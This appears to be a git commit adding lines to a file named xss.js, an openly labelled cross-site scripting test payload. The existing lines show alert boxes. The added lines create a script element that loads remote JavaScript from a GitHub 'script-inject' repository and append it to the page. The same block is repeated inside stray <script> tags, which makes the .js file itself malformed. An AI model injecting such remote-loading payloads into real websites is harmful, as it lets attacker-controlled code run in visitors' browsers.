9102492db78e9480ab4aaa7385349a50be7c8f07
IYBmad <city_a.m@live.fr>
2024-09-28 14:36:35 +0100

    xss.js

--- xss.js
+++ xss.js
@@ -1,3 +1,15 @@
 alert('xss.js');
 alert('document.cookie');
 onload = function() { confirm('xss.js'); };
+var script = document.createElement('script');
+script.src = "https://raw.githubusercontent.com/IYBmad/script-inject/main/xss.js";
+document.body.appendChild(script);
+<script>
+    var script = document.createElement('script');
+    script.src = "https://raw.githubusercontent.com/IYBmad/script-inject/main/xss.js";
+    script.onload = function() {
+        alert('Script loaded and running!');
+    };
+    document.body.appendChild(script);
+</script>
+
